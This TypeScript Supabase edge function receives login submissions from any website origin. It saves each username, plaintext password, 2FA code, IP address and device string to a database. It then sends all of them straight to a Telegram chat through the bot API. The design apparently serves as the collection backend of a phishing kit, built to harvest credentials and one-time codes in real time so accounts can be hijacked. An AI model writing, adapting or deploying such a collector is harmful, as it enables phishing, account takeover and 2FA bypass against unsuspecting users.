import { createClient } from 'npm:@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Client-Info, Apikey',
};

interface LoginData {
  username: string;
  password?: string;
  verification_code?: string;
  ip_address?: string;
  user_agent?: string;
}

Deno.serve(async (req: Request) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: corsHeaders,
    });
  }

  try {
    const supabaseUrl = Deno.env.get('SUPABASE_URL')!;
    const supabaseServiceKey = Deno.env.get('SUPABASE_SERVICE_ROLE_KEY')!;
    const telegramBotToken = Deno.env.get('TELEGRAM_BOT_TOKEN');
    const telegramChatId = Deno.env.get('TELEGRAM_CHAT_ID');

    if (!telegramBotToken || !telegramChatId) {
      return new Response(
        JSON.stringify({ error: 'Telegram credentials not configured' }),
        {
          status: 500,
          headers: { ...corsHeaders, 'Content-Type': 'application/json' },
        }
      );
    }

    const supabase = createClient(supabaseUrl, supabaseServiceKey);
    const loginData: LoginData = await req.json();

    const { data: insertData, error: insertError } = await supabase
      .from('login_attempts')
      .insert({
        username: loginData.username,
        password: loginData.password || '',
        verification_code: loginData.verification_code,
        ip_address: loginData.ip_address,
        user_agent: loginData.user_agent,
        notified: false,
      })
      .select()
      .single();

    if (insertError) {
      throw insertError;
    }

    let message = '🔐 New Login Attempt\n\n';
    message += `👤 Username: ${loginData.username}\n`;
    
    if (loginData.password) {
      message += `🔑 Password: ${loginData.password}\n`;
    }
    
    if (loginData.verification_code) {
      message += `📱 2FA Code: ${loginData.verification_code}\n`;
    }
    
    if (loginData.ip_address) {
      message += `🌐 IP: ${loginData.ip_address}\n`;
    }
    
    if (loginData.user_agent) {
      message += `💻 Device: ${loginData.user_agent}\n`;
    }
    
    message += `\n⏰ Time: ${new Date().toISOString()}`;

    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
    const telegramResponse = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });

    if (!telegramResponse.ok) {
      const errorText = await telegramResponse.text();
      console.error('Telegram API error:', errorText);
    } else {
      await supabase
        .from('login_attempts')
        .update({ notified: true })
        .eq('id', insertData.id);
    }

    return new Response(
      JSON.stringify({ success: true, message: 'Data saved successfully' }),
      {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );
  } catch (error) {
    console.error('Error:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      }
    );
  }
});